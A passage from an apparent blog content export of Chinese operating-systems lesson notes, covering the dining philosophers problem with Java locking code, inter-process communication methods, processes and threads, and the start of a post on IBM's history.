&amp;&amp; forks[id] == id) &#123; this.state = PHIS.EATING; &#125; else &#123; return; &#125; &#125; Thread.sleep((long) Math.floor(Math.random()*1000)); &#125; eat方法依赖于forks对象的锁，相当于eat方法这里会同步——因为这里有读取临界区操作做。Thread.sleep依然用于描述eat方法的时间开销。sleep方法没有放到synchronized内是因为在并发控制时，应该尽量较少锁的范围，这样可以增加更大的并发量。 以上，我们对问题进行了一个基本的抽象。接下来请你思考在什么情况会发生死锁？ 死锁（DeadLock）和活锁（LiveLock）首先，可以思考一种最简单的解法，每个哲学家用一个while循环表示，代码如下： 123456789101112while(true)&#123; think(); _take(LEFT(id)); _take(id); eat(); _put(LEFT(id)); _put(id); &#125;void _take(id)&#123; while(forks[id] != -1) &#123; Thread.yield(); &#125; Thread.sleep(10); // 模拟I/O用时&#125; _take可以考虑阻塞，直到哲学家得到叉子。上面程序我们还没有进行并发控制，会发生竞争条件。 顺着这个思路，就可以想到加入并发控制，代码如下： 1234567891011121314151617while(true)&#123; think(); synchronized(fork[LEFT(id)]) &#123; _take(LEFT(id)); synchronized(fork[id]) &#123; _take(id); &#125; &#125; eat(); synchronized(fork[LEFT(id)]) &#123; _put(LEFT(id)); synchronized(fork[id]) &#123; _put(id); &#125; &#125;&#125; 上面的并发控制，会发生死锁问题，大家可以思考这样一个时序，如果 5 个哲学家都同时通过synchronized(fork[LEFT(id)])，有可能会出现下面的情况： 第 0 个哲学家获得叉子 4，接下来请求叉子 0； 第 1 个哲学家获得叉子 0，接下来请求叉子 1； 第 2 个哲学家获得叉子 1，接下来请求叉子 2； 第 3 个哲学家获得叉子 2，接下来请求叉子 3； 第 4 个哲学家获得叉子 3，接下来请求叉子 4。 为了帮助你理解，这里我画了一幅图。 如上图所示，可以看到这是一种循环依赖的关系，在这种情况下所有哲学家都获得了一个叉子，并且在等待下一个叉子。这种等待永远不会结束，因为没有哲学家愿意放弃自己拿起的叉子。 以上这种情况称为死锁（Deadlock），这是一种饥饿（Starvation）的形式。从概念上说，死锁是线程间互相等待资源，但是没有一个线程可以进行下一步操作。饥饿就是因为某种原因导致线程得不到需要的资源，无法继续工作。死锁是饥饿的一种形式，因为循环等待无法得到资源。哲学家就餐问题，会形成一种环状的死锁（循环依赖）， 因此非常具有代表性。 死锁有 4 个基本条件。 资源存在互斥逻辑：每次只有一个线程可以抢占到资源。这里是哲学家抢占叉子。 持有等待：这里哲学家会一直等待拿到叉子。 禁止抢占：如果拿不到资源一直会处于等待状态，而不会释放已经拥有的资源。 循环等待：这里哲学家们会循环等待彼此的叉子。 刚才提到死锁也是一种饥饿（Starvation）的形式，饥饿比较简单，就是线程长期拿不到需要的资源，无法进行下一步操作。 要解决死锁的问题，可以考虑哲学家拿起 1 个叉子后，如果迟迟没有等到下一个叉子，就放弃这次操作。比如 Java 的 Lock Interface 中，提供的tryLock方法，就可以实现定时获取： 12var lock = new ReentrantLock();lock.tryLock(5, TimeUnit.SECONDS); Java 提供的这个能力是拿不到锁，就报异常，并可以依据这个能力开发释放已获得资源的能力。 但是这样，我们会碰到一个叫作活锁（LiveLock）的问题。LiveLock 也是一种饥饿。可能在某个时刻，所有哲学及都拿起了左手的叉子，然后发现右手的叉子拿不到，就放下了左手的叉子——如此周而复始，这就是一种活锁。所有线程都在工作，但是没有线程能够进一步——解决问题。 在实际工作场景下，LiveLock 可以靠概率解决，因为同时拿起，又同时放下这种情况不会很多。实际工作场景很多系统，确实依赖于这个问题不频发。但是，优秀的设计者不能把系统设计依托在一个有概率风险的操作上，因此我们需要继续往深一层思考。 解决方案其实解决上述问题有很多的方案，最简单、最直观的方法如下： 12345678910while(true)&#123; synchronized(someLock) &#123; think(); _take(LEFT(id)); _take(id); eat(); _put(LEFT(id)); _put(id); &#125;&#125; 上面这段程序同时只允许一个哲学家使用所有资源，我们用synchronized构造了一种排队的逻辑。而哲学家，每次必须拿起所有的叉子，吃完，再到下一哲学家。 这样并发度是 1，同时最多有一个线程在执行。 这样的方式可以完成任务，但是性能太差。 另一种方法是规定拿起过程必须同时拿起，放下过程也同时放下，代码如下： 12345678910111213141516171819202122while(true)&#123; think(); synchronized(someLock) &#123; _takeForks(); &#125; eat(); synchronized(someLock) &#123; _puts(); &#125;&#125;void _takeForks()&#123; if( forks[LEFT(id)] == -1 &amp;&amp; forks[id] == -1 ) &#123; forks[LEFT(id)] = id; forks[id] = id; &#125;&#125;void _puts()&#123; if(forks[LEFT(id)] == id) forks[LEFT(id)] = -1; if(forks[id] == id) forks[id] = -1;&#125; 上面这段程序，think函数没有并发控制，一个哲学家要么拿起两个叉子，要么不拿起，这样并发度最高为 2（最多有两个线程同时执行）。而且，这个算法中只有一个锁，因此不存在死锁和饥饿问题。 到这里，我们已经对这个问题有了一个初步的方案，那么如何进一步优化呢？ 思考和最终方案整个问题复杂度的核心在于哲学家拿起叉子是有成本的。好比线程读取磁盘，需要消耗时间。哲学家的思考，是独立的。好比读取了磁盘数据，进行计算。那么有没有办法允许 5 个哲学家都同时去拿叉子呢？这样并发度是最高的。 经过初步思考，马上会发现这里有环状依赖， 会出现死锁。 原因就是如果 5 个哲学家同时拿叉子，那就意味着有的哲学家必须要放弃叉子。但是如果不放下会出现什么情况呢？ 假设当一个哲学家发现自己拿不到两个叉子的时候，他去和另一个哲学家沟通把自己的叉子给对方。这样就相当于，有一个转让方法。相比于磁盘 I/O，转让内存中的数据成本就低的多了。 我们假设有这样一个转让的方法，代码如下： 1234 void _transfer(int fork, int philosopher) &#123; forks[fork] = philosopher;dirty[fork] = false; &#125; 这个方法相当于把叉子转让给另一个哲学家，这里你先不用管上面代码中的 dirty，后文中会讲到。而获取叉子的过程，我们可以进行调整，代码如下： 12345678910111213141516void take(int i) throws InterruptedException &#123; synchronized (forks[i]) &#123; if(forks[i] == -1) &#123; _take(id); &#125; else &#123; Philosopher other = philosophers[forks[i]]; if(other.state != PHIS.EATING &amp;&amp; dirty[i]) &#123; other._transfer(i, forks[i]); &#125; &#125; &#125; &#125;void _take(int i) throws InterruptedException &#123; Thread.sleep(10); forks[i] = id;&#125; 这里我们把每个叉子看作一个锁，有多少个叉子，就有多少个锁，相当于同时可以拿起 5 个叉子（并发度是 5）。如果当前没有人拿起叉子，那么可以自己拿起。 如果叉子属于其他哲学家，就需要判断对方的状态。只要对方不在EATING，就可以考虑转让叉子。 最后是对 LiveLock 的思考，为了避免叉子在两个哲学家之间来回转让，我们为每个叉子增加了一个dirty属性。一开始叉子的dirty是true，每次转让后，哲学家会把自己的叉子擦干净给另一个哲学家。转让的前置条件是叉子是dirty的，所以叉子在两个哲学家之间只会转让一次。 通过上面算法，我们就可以避免死锁、饥饿以及提高读取数据（获取叉子）的并发度。最后完整的程序如下，给你做参考： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138package com.test;import java.util.Arrays;import java.util.concurrent.TimeUnit;import java.util.concurrent.locks.ReentrantLock;public class DiningPhilosophers &#123; public static void main(String[] args) &#123; for (int i = 0; i &lt; 5; i++) &#123; new Thread(new Philosopher(i)).start(); &#125; &#125; enum PHIS &#123; THINKING, HUNGRY, EATING &#125; static class Philosopher implements Runnable &#123; private static Philosopher[] philosophers; private static Integer[] forks; private static boolean[] dirty; static &#123; philosophers = new Philosopher[5]; forks = new Integer[5]; dirty = new boolean[5]; for (int i = 0; i &lt; 5; i++) &#123; philosophers[i] = new Philosopher(i); forks[i] = -1; dirty[i] = true; &#125; &#125; private PHIS state = PHIS.THINKING; private int id; public Philosopher(int id) &#123; this.id = id; &#125; private static int LEFT(int i) &#123; return i == 0 ? 4 : i - 1; &#125; void think() throws InterruptedException &#123; System.out.println(String.format(&quot;Philosopher %d thinking...&quot;, id)); Thread.sleep((long) Math.floor(Math.random() * 1000)); this.state = PHIS.HUNGRY; System.out.println(Arrays.toString(forks)); // System.out.println(Arrays.toString(dirty)); if (forks[LEFT(id)] == id &amp;&amp; forks[id] == id) &#123; this.state = PHIS.EATING; &#125; else &#123; return; &#125; System.out.printf(&quot;Philosopher %d eating...%n&quot;, id); Thread.sleep((long) Math.floor(Math.random() * 1000)); synchronized (forks) &#123; dirty[LEFT(id)] = true; dirty[id] = true; &#125; var lock = new ReentrantLock(); lock.tryLock(5, TimeUnit.SECONDS); state = PHIS.THINKING; &#125; void _take(int i) throws InterruptedException &#123; Thread.sleep(10); forks[i] = id; &#125; void _transfer(int fork, int philosopher) &#123; forks[fork] = philosopher; dirty[fork] = false; &#125; void _putdown(int i) throws InterruptedException &#123; Thread.sleep(10); forks[i] = -1; &#125; void take(int i) throws InterruptedException &#123; synchronized (forks[i]) &#123; if (forks[i] == -1) &#123; _take(id); &#125; else &#123; Philosopher other = philosophers[forks[i]]; if (other.state != PHIS.EATING &amp;&amp; dirty[i]) &#123; other._transfer(i, forks[i]); &#125; &#125; &#125; &#125; void eat() throws InterruptedException &#123; synchronized (forks) &#123; if(forks[LEFT(id)] == id &amp;&amp; forks[id] == id) &#123; this.state = PHIS.EATING; &#125; else &#123; return; &#125; &#125; Thread.sleep((long) Math.floor(Math.random()*1000)); &#125; void takeForks() throws InterruptedException &#123; take(LEFT(id)); take(id); &#125; @Override public void run() &#123; try &#123; while (true) &#123; think(); while (state == PHIS.HUNGRY) &#123; takeForks(); System.out.println(&quot;here--&quot; + Math.random()); eat(); &#125; &#125; &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 总结那么通过这节课的学习，你现在可以尝试来回答本节关联的面试题目：什么情况下会触发饥饿和死锁？ 【解析】 线程需要资源没有拿到，无法进行下一步，就是饥饿。死锁（Deadlock）和活锁（Livelock）都是饥饿的一种形式。 非抢占的系统中，互斥的资源获取，形成循环依赖就会产生死锁。死锁发生后，如果利用抢占解决，导致资源频繁被转让，有一定概率触发活锁。死锁、活锁，都可以通过设计并发控制算法解决，比如哲学家就餐问题。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"进程间通讯","slug":"计操/进程间通信","date":"2021-07-23T11:32:32.000Z","updated":"2021-07-23T09:11:59.927Z","comments":true,"path":"2021/07/23/计操/进程间通信/","link":"","permalink":"https://www.shanghua.live/2021/07/23/%E8%AE%A1%E6%93%8D/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/","excerpt":"","text":"什么是进程间通信？进程间通信（Intermediate Process Communication，IPC）。所谓通信就是交换数据。所以，狭义地说，就是操作系统创建的进程们之间在交换数据。 我们今天不仅讨论狭义的通信，还要讨论 IPC 更广泛的意义——程序间的通信。 程序可以是进程，可以是线程，可以是一个进程的两个部分（进程自己发送给自己），也可以是分布式的——总之，今天讨论的是广义的交换数据。 管道管道提供了一种非常重要的能力，就是组织计算。进程不用知道有管道存在，因此管道的设计是非侵入的。程序员可以先着重在程序本身的设计，只需要预留响应管道的接口，就可以利用管道的能力。比如用shell执行MySQL语句，可能会这样： 1进程1 | 进程2 | 进程3 | mysql -u... -p | 爬虫进程 我们可以由进程 1、进程 2、进程 3 计算出 MySQL 需要的语句，然后直接通过管道执行。MySQL经过计算将结果传给一个爬虫进程，爬虫就开始工作。MySQL并不是设计用于管道，爬虫进程也不是设计专门用于管道，只是程序员恰巧发现可以这样用，完美地解决了自己的问题，比如：用管道构建一个微型爬虫然后把结果入库。 我们还学过一个词叫作命名管道。命名管道并没有改变管道的用法。相比匿名管道，命名管道提供了更多的编程手段。比如： 12进程1 &gt; namedpipe进程2 &gt; namedpipe 上面的程序将两个进程的临时结果都同时重定向到 namedpipe，相当于把内容合并了再找机会处理。再比如说，你的进程要不断查询本地的 MySQL，也可以考虑用命名管道将查询传递给 MySQL，再用另一个命名管道传递回来。这样可以省去和 localhost 建立 TCP 3 次握手的时间。 当然，现在数据库都是远程的了，这里只是一个例子。 管道的核心是不侵入、灵活，不会增加程序设计负担，又能组织复杂的计算过程 本地内存共享同一个进程的多个线程本身是共享进程内存的。 这种情况不需要特别考虑共享内存。如果是跨进程的线程（或者理解为跨进程的程序），可以考虑使用共享内存。内存共享是现代操作系统提供的能力， Unix 系操作系统，包括 Linux 中有 POSIX 内存共享库——shmem。（如果你感兴趣可以参考网页中的内容 https://www.man7.org/linux/man-pages/man7/shm_overview.7.html ，这里不做太深入地分析。）Linux 内存共享库的实现原理是以虚拟文件系统的形式，从内存中划分出一块区域，供两个进程共同使用。看上去是文件，实际操作是内存。 共享内存的方式，速度很快，但是程序不是很好写，因为这是一种侵入式的开发，也就是说你需要为此撰写大量的程序。比如如果修改共享内存中的值，需要调用 API。如果考虑并发控制，还要处理同步问题等。因此，只要不是高性能场景，进程间通信通常不考虑共享内存的方式。 本地消息/队列内存共享不太好用，因此本地消息有两种常见的方法。一种是用消息队列——现代操作系统都会提供类似的能力。Unix 系可以使用 POSIX 标准的 mqueue。另一种方式，就是直接用网络请求，比如 TCP/IP 协议，也包括建立在这之上的更多的通信协议（这些我们在下文中的“远程调用”部分详细讲解）。 本质上，这些都是收/发消息的模式。进程将需要传递的数据封装成格式确定的消息，这对写程序非常有帮助。程序员可以根据消息类型，分门别类响应消息；也可以根据消息内容，触发特殊的逻辑操作。在消息体量庞大的情况下，也可以构造生产者队列和消费者队列，用并发技术进行处理。 远程调用远程调用（Remote Procedure Call，RPC）是一种通过本地程序调用来封装远程服务请求的方法。 程序员调用 RPC 的时候，程序看上去是在调用一个本地的方法，或者执行一个本地的任务，但是后面会有一个服务程序（通常称为 stub），将这种本地调用转换成远程网络请求。 同理，服务端接到请求后，也会有一个服务端程序（stub），将请求转换为一个真实的服务端方法调用。 你可以观察上面这张图，表示客户端和服务端通信的过程，一共是 10 个步骤，分别是： 客户端调用函数（方法）； stub 将函数调用封装为请求； 客户端 socket 发送请求，服务端 socket 接收请求； 服务端 stub 处理请求，将请求还原为函数调用； 执行服务端方法； 返回结果传给 stub； stub 将返回结果封装为返回数据； 服务端 socket 发送返回数据，客户端 socket 接收返回数据； 客户端 socket 将数据传递给客户端 stub； 客户端 stub 把返回数据转义成函数返回值。 RPC 调用过程有很多约定， 比如函数参数格式、返回结果格式、异常如何处理。还有很多细粒度的问题，比如处理 TCP 粘包、处理网络异常、I/O 模式选型——其中有很多和网络相关的知识比较复杂 上面这些问题比较棘手，因此在实战中通常的做法是使用框架。比如 Thrift 框架（Facebook 开源）、Dubbo 框架（阿里开源）、grpc（Google 开源）。这些 RPC 框架通常支持多种语言，这需要一个接口定义语言支持在多个语言间定义接口（IDL）。 RPC 调用的方式比较适合微服务环境的开发，当然 RPC 通常需要专业团队的框架以支持高并发、低延迟的场景。不过，硬要说 RPC 有额外转化数据的开销（主要是序列化），也没错，但这不是 RPC 的主要缺点。RPC 真正的缺陷是增加了系统间的耦合。当系统主动调用另一个系统的方法时，就意味着在增加两个系统的耦合。长期增加 RPC 调用，会让系统的边界逐渐腐化。这才是使用 RPC 时真正需要注意的东西。 消息队列既然 RPC 会增加耦合，那么怎么办呢——可以考虑事件。事件不会增加耦合，如果一个系统订阅了另一个系统的事件，那么将来无论谁提供同类型的事件，自己都可以正常工作。系统依赖的不是另一个系统，而是某种事件。如果哪天另一个系统不存在了，只要事件由其他系统提供，系统仍然可以正常运转。 实现事件可以用消息队列。具体这块架构技术我不再展开，你如果感兴趣可以课下去研究 Domain Drive Design 这个方向的知识。 另一个用到消息队列的场景是纯粹大量数据的传输。 比如日志的传输，中间可能还会有收集、清洗、筛选、监控的节点，这就构成了一个庞大的分布式计算网络。 总的来说，消息队列是一种耦合度更低，更加灵活的模型。但是对系统设计者的要求也会更高，对系统本身的架构也会有一定的要求。具体场景的消息队列有 Kafka，主打处理 feed；RabbitMQ、ActiveMQ、 RocketMQ 等主打分布式应用间通信（应用解耦）。 总结那么通过这节课的学习，你现在可以尝试来回答本节关联的面试题目：进程间通信都有哪些方法？ 【解析】 你可以从单机和分布式角度给面试管阐述。 如果考虑单机模型，有管道、内存共享、消息队列。这三个模型中，内存共享程序最难写，但是性能最高。管道程序最好写，有标准接口。消息队列程序也比较好写，比如用发布/订阅模式实现具体的程序。 如果考虑分布式模型，就有远程调用、消息队列和网络请求。直接发送网络请求程序不好写，不如直接用实现好的 RPC 调用框架。RPC 框架会增加系统的耦合，可以考虑 消息队列，以及发布订阅事件的模式，这样可以减少系统间的耦合。","categories":[],"tags":[{"name":"计操","slug":"计操","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E6%93%8D/"}]},{"title":"进程和线程","slug":"计操/进程和线程","date":"2021-07-22T12:23:13.000Z","updated":"2021-07-23T03:58:08.588Z","comments":true,"path":"2021/07/22/计操/进程和线程/","link":"","permalink":"https://www.shanghua.live/2021/07/22/%E8%AE%A1%E6%93%8D/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"进程和线程进程（Process），顾名思义就是正在执行的应用程序，是软件的执行副本。而线程是轻量级的进程。 进程是分配资源的基础单位。而线程很长一段时间被称作轻量级进程（Light Weighted Process），是程序执行的基本单位。 在计算机刚刚诞生的年代，程序员拿着一个写好程序的闪存卡，插到机器里，然后电能推动芯片计算，芯片每次从闪存卡中读出一条指令，执行后接着读取下一条指令。闪存中的所有指令执行结束后，计算机就关机。 一开始，这种单任务的模型，在那个时代叫作作业（Job），当时计算机的设计就是希望可以多处理作业。图形界面出现后，人们开始利用计算机进行办公、购物、聊天、打游戏等，因此一台机器正在执行的程序会被随时切来切去。于是人们想到，设计进程和线程来解决这个问题。 每一种应用，比如游戏，执行后是一个进程。但是游戏内部需要图形渲染、需要网络、需要响应用户操作，这些行为不可以互相阻塞，必须同时进行，这样就设计成线程。 资源分配问题设计进程和线程，操作系统需要思考分配资源。最重要的 3 种资源是：计算资源（CPU）、内存资源和文件资源。早期的 OS 设计中没有线程，3 种资源都分配给进程，多个进程通过分时技术交替执行，进程之间通过管道技术等进行通信。 但是这样做的话，设计者们发现用户（程序员），一个应用往往需要开多个进程，因为应用总是有很多必须要并行做的事情。并行并不是说绝对的同时，而是说需要让这些事情看上去是同时进行的——比如图形渲染和响应用户输入。于是设计者们想到了，进程下面，需要一种程序的执行单位，仅仅被分配 CPU 资源，这就是线程。 轻量级进程线程设计出来后，因为只被分配了计算资源（CPU），因此被称为轻量级进程。被分配的方式，就是由操作系统调度线程。操作系统创建一个进程后，进程的入口程序被分配到了一个主线程执行，这样看上去操作系统是在调度进程，其实是调度进程中的线程。 这种被操作系统直接调度的线程，我们也成为内核级线程。另外，有的程序语言或者应用，用户（程序员）自己还实现了线程。相当于操作系统调度主线程，主线程的程序用算法实现子线程，这种情况我们称为用户级线程。Linux 的 PThread API 就是用户级线程，KThread API 则是内核级线程。 分时和调度因为通常机器中 CPU 核心数量少（从几个到几十个）、进程&amp;线程数量很多（从几十到几百甚至更多），你可以类比为发动机少，而机器多，因此进程们在操作系统中只能排着队一个个执行。每个进程在执行时都会获得操作系统分配的一个时间片段，如果超出这个时间，就会轮到下一个进程（线程）执行。再强调一下，现代操作系统都是直接调度线程，不会调度进程。 分配时间片段如下图所示，进程 1 需要 2 个时间片段，进程 2 只有 1 个时间片段，进程 3 需要 3 个时间片段。因此当进程 1 执行到一半时，会先挂起，然后进程 2 开始执行；进程 2 一次可以执行完，然后进程 3 开始执行，不过进程 3 一次执行不完，在执行了 1 个时间片段后，进程 1 开始执行；就这样如此周而复始。这个就是分时技术。 下面这张图更加直观一些，进程 P1 先执行一个时间片段，然后进程 P2 开始执行一个时间片段， 然后进程 P3，然后进程 P4…… 注意，上面的两张图是以进程为单位演示，如果换成线程，操作系统依旧是这么处理。 进程和线程的状态一个进程（线程）运行的过程，会经历以下 3 个状态： 进程（线程）创建后，就开始排队，此时它会处在“就绪”（Ready）状态； 当轮到该进程（线程）执行时，会变成“运行”（Running）状态； 当一个进程（线程）将操作系统分配的时间片段用完后，会回到“就绪”（Ready）状态。 我这里一直用进程(线程）是因为旧的操作系统调度进程，没有线程；现代操作系统调度线程。 有时候一个进程（线程）会等待磁盘读取数据，或者等待打印机响应，此时进程自己会进入“阻塞”（Block）状态。 因为这时计算机的响应不能马上给出来，而是需要等待磁盘、打印机处理完成后，通过中断通知 CPU，然后 CPU 再执行一小段中断控制程序，将控制权转给操作系统，操作系统再将原来阻塞的进程（线程）置为“就绪”（Ready）状态重新排队。 而且，一旦一个进程（线程）进入阻塞状态，这个进程（线程）此时就没有事情做了，但又不能让它重新排队（因为需要等待中断），所以进程（线程）中需要增加一个“阻塞”（Block）状态。 注意，因为一个处于“就绪”（Ready）的进程（线程）还在排队，所以进程（线程）内的程序无法执行，也就是不会触发读取磁盘数据的操作，这时，“就绪”（Ready）状态无法变成阻塞的状态，因此下图中没有从就绪到阻塞的箭头。 而处于“阻塞”（Block）状态的进程（线程）如果收到磁盘读取完的数据，它又需要重新排队，所以它也不能直接回到“运行”（Running）状态，因此下图中没有从阻塞态到运行态的箭头。 进程和线程的设计接下来我们思考几个核心的设计约束： 进程和线程在内存中如何表示？需要哪些字段？ 进程代表的是一个个应用，需要彼此隔离，这个隔离方案如何设计？ 操作系统调度线程，线程间不断切换，这种情况如何实现？ 需要支持多 CPU 核心的环境，针对这种情况如何设计？ 接下来我们来讨论下这4个问题。 进程和线程的表示可以这样设计，在内存中设计两张表，一张是进程表、一张是线程表。 进程表记录进程在内存中的存放位置、PID 是多少、当前是什么状态、内存分配了多大、属于哪个用户等，这就有了进程表。如果没有这张表，进程就会丢失，操作系统不知道自己有哪些进程。这张表可以考虑直接放到内核中。 细分的话，进程表需要这几类信息。 描述信息：这部分是描述进程的唯一识别号，也就是 PID，包括进程的名称、所属的用户等。 资源信息：这部分用于记录进程拥有的资源，比如进程和虚拟内存如何映射、拥有哪些文件、在使用哪些 I/O 设备等，当然 I/O 设备也是文件。 内存布局：操作系统也约定了进程如何使用内存。如下图所示，描述了一个进程大致内存分成几个区域，以及每个区域用来做什么。 每个区域我们叫作一个段。 操作系统还需要一张表来管理线程，这就是线程表。线程也需要 ID， 可以叫作 ThreadID。然后线程需要记录自己的执行状态（阻塞、运行、就绪）、优先级、程序计数器以及所有寄存器的值等等。线程需要记录程序计数器和寄存器的值，是因为多个线程需要共用一个 CPU，线程经常会来回切换，因此需要在内存中保存寄存器和 PC 指针的值。 用户级线程和内核级线程存在映射关系，因此可以考虑在内核中维护一张内核级线程的表，包括上面说的字段。 如果考虑到这种映射关系，比如 n-m 的多对多映射，可以将线程信息还是存在进程中，每次执行的时候才使用内核级线程。相当于内核中有个线程池，等待用户空间去使用。每次用户级线程把程序计数器等传递过去，执行结束后，内核线程不销毁，等待下一个任务。这里其实有很多灵活的实现，总体来说，创建进程开销大、成本高；创建线程开销小，成本低。 隔离方案操作系统中运行了大量进程，为了不让它们互相干扰，可以考虑为它们分配彼此完全隔离的内存区域，即便进程内部程序读取了相同地址，而实际的物理地址也不会相同。这就好比 A 小区的 10 号楼 808 和 B 小区的 10 号楼 808 不是一套房子，这种方法叫作地址空间 所以在正常情况下进程 A 无法访问进程 B 的内存，除非进程 A 找到了某个操作系统的漏洞，恶意操作了进程 B 的内存,或者使用进程间通讯的手段 对于一个进程的多个线程来说，可以考虑共享进程分配到的内存资源，这样线程就只需要被分配执行资源。 进程（线程）切换进程（线程）在操作系统中是不断切换的，现代操作系统中只有线程的切换。 每次切换需要先保存当前寄存器的值的内存，注意 PC 指针也是一种寄存器。当恢复执行的时候，就需要从内存中读出所有的寄存器，恢复之前的状态，然后执行。 上面讲到的内容，我们可以概括为以下 5 个步骤： 当操作系统发现一个进程（线程）需要被切换的时候，直接控制 PC 指针跳转是非常危险的事情，所以操作系统需要发送一个“中断”信号给 CPU，停下正在执行的进程（线程）。 当 CPU 收到中断信号后，正在执行的进程（线程）会立即停止。注意，因为进程（线程）马上被停止，它还来不及保存自己的状态，所以后续操作系统必须完成这件事情。 操作系统接管中断后，趁寄存器数据还没有被破坏，必须马上执行一小段非常底层的程序（通常是汇编编写），帮助寄存器保存之前进程（线程）的状态。 操作系统保存好进程状态后，执行调度程序，决定下一个要被执行的进程（线程）。 最后，操作系统执行下一个进程（线程）。 当然，一个进程（线程）被选择执行后，它会继续完成之前被中断时的任务，这需要操作系统来执行一小段底层的程序帮助进程（线程）恢复状态。 一种可能的算法就是通过栈这种数据结构。进程（线程）中断后，操作系统负责压栈关键数据（比如寄存器）。恢复执行时，操作系统负责出栈和恢复寄存器的值。 多核处理在多核系统中我们上面所讲的设计原则依然成立，只不过动力变多了，可以并行执行的进程（线程）。通常情况下，CPU 有几个核，就可以并行执行几个进程（线程）。这里强调一个概念，我们通常说的并发，英文是 concurrent，指的在一段时间内几个任务看上去在同时执行（不要求多核）；而并行，英文是 parallel，任务必须绝对的同时执行（要求多核）。 比如一个 4 核的 CPU 就好像拥有 4 条流水线，可以并行执行 4 个任务。一个进程的多个线程执行过程则会产生竞争条件，。因为操作系统提供了保存、恢复进程状态的能力，使得进程（线程）也可以在多个核心之间切换。 创建进程（线程）的 API用户想要创建一个进程，最直接的方法就是从命令行执行一个程序，或者双击打开一个应用。但对于程序员而言，显然需要更好的设计。 站在设计者的角度，你可以这样思考：首先，应该有 API 打开应用，比如可以通过函数打开某个应用；另一方面，如果程序员希望执行完一段代价昂贵的初始化过程后，将当前程序的状态复制好几份，变成一个个单独执行的进程，那么操作系统提供了 fork 指令。 也就是说，每次 fork 会多创造一个克隆的进程，这个克隆的进程，所有状态都和原来的进程一样，但是会有自己的地址空间。如果要创造 2 个克隆进程，就要 fork 两次。 你可能会问：那如果我就是想启动一个新的程序呢？ 我在上文说过：操作系统提供了启动新程序的 API。 你可能还会问：如果我就是想用一个新进程执行一小段程序，比如说每次服务端收到客户端的请求时，我都想用一个进程去处理这个请求。 如果是这种情况，我建议你不要单独启动进程，而是使用线程。因为进程的创建成本实在太高了，因此不建议用来做这样的事情：要创建条目、要分配内存，特别是还要在内存中形成一个个段，分成不同的区域。所以通常，我们更倾向于多创建线程。 不同程序语言会自己提供创建线程的 API，比如 Java 有 Thread 类；go 有 go-routine（注意不是协程，是线程）。 总结本讲我们学习了进程和线程的基本概念。了解了操作系统如何调度进程（线程）和分时算法的基本概念，然后了解进程（线程）的 3 种基本状态。线程也被称作轻量级进程，由操作系统直接调度的，是内核级线程。我们还学习了线程切换保存、恢复状态的过程。 我们发现进程和线程是操作系统为了分配资源设计的两个概念，进程承接存储资源，线程承接计算资源。而进程包含线程，这样就可以做到进程间内存隔离。这是一个非常巧妙的设计，概念清晰，思路明确，你以后做架构的时候可以多参考这样的设计。 如果只有进程，或者只有线程，都不能如此简单的解决我们遇到的问题。 进程的开销比线程大在了哪里？ Linux 中创建一个进程自然会创建一个线程，也就是主线程。创建进程需要为进程划分出一块完整的内存空间，有大量的初始化操作，比如要把内存分段（堆栈、正文区等）。创建线程则简单得多，只需要确定 PC 指针和寄存器的值，并且给线程分配一个栈用于执行程序，同一个进程的多个线程间可以复用堆栈。因此，创建进程比创建线程慢，而且进程的内存开销更大。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"Win,Mac,Unix,Linux","slug":"计操/Win,Mac,Unix,Linux","date":"2021-07-22T10:24:55.000Z","updated":"2021-07-22T05:03:26.623Z","comments":true,"path":"2021/07/22/计操/Win,Mac,Unix,Linux/","link":"","permalink":"https://www.shanghua.live/2021/07/22/%E8%AE%A1%E6%93%8D/Win,Mac,Unix,Linux/","excerpt":"","text":"Win,Mac,Unix,Linux在我的印象中 Windows 才是最容易被攻击的操作系统，没想到 2020 年美国 NIST 的报告中， Debian 竟然是过去 20 年中漏洞最多的操作系统。Debain 以 3067 个漏洞稳居第一，第二名是 Android，第三名是 Linux Kernel。那么为什么 Debian 漏洞数会排在第一位呢？ IBM话不多说，我们正式开始。1880 年美国进行了一次人口普查，涉及5000 多万人。因为缺少技术手段，总共用了 7 年半时间才完成。后来霍尔列斯发明了一种穿孔制表机，大大改善了这种情况，而后他还给这种机器申请了专利。 1896 年，霍尔列斯成立了 CRT 公司，也就是 IBM 的前身。后来霍尔列斯经营不善，遇到困难，中间有金融家，军火商都参与过 CRT 的经营，却没能使得情况好转。 直到 1914 年托马斯·约翰·沃森（老沃森）加盟CRT，帮助霍尔列斯管理 CRT，情况才逐渐好转。老沃森是一个销售出身，很懂得建立销售团队的文化，所以才能逐渐把 CRT 的业务做起来，成为 CRT 的实际掌控者。在 1924 年 CRT 正式更名为 IBM，开启了沃森的时代。 IBM（International Business Machines Corporation）一开始是卖机器的。后来沃森的儿子，也就是小沃森后来逐渐接管了 IBM。小沃森对蓬勃发展的计算机产业非常感兴趣，同时也很看好计算机市场。但也正因如此，沃森父子间发生了一场冲突。老沃森的著名论断也是出自这场冲突：世界上对计算机有需求的人不会超过 5 个。于是我们都成了这幸运的 5 个人之一。 所以 IBM 真正开始做计算机是 1949 年小沃森逐渐掌权后。1954 年，IBM 推出了世界上第一个拥有操作系统的商用计算机——IBM 704，并且在 1956 年时独占了计算机市场的 70% 的份额。 你可能会问，之前的计算机没有操作系统吗？ 我以第一台可编程通用计算机 ENIAC 为例，ENIAC 虽然支持循环、分支判断语句，但是只支持写机器语言。ENIAC 的程序通常需要先写在纸上，然后再由专业的工程师输入到计算机中。 对于 ENIAC 来说执行的是一个个作业，就是每次把输入的程序执行完。 所以在 IBM 704 之前，除了实验室产品外，正式投入使用的计算机都是没有操作系统的。但当时 IBM 704 的操作系统是美国通用移动公司帮助研发的 GM-NAA I/O 系统，而非 IBM 自研。IBM 一直没有重视操作系统的研发能力，这也为后来 IBM 使用微软的操作系统，以及进军个人 电脑 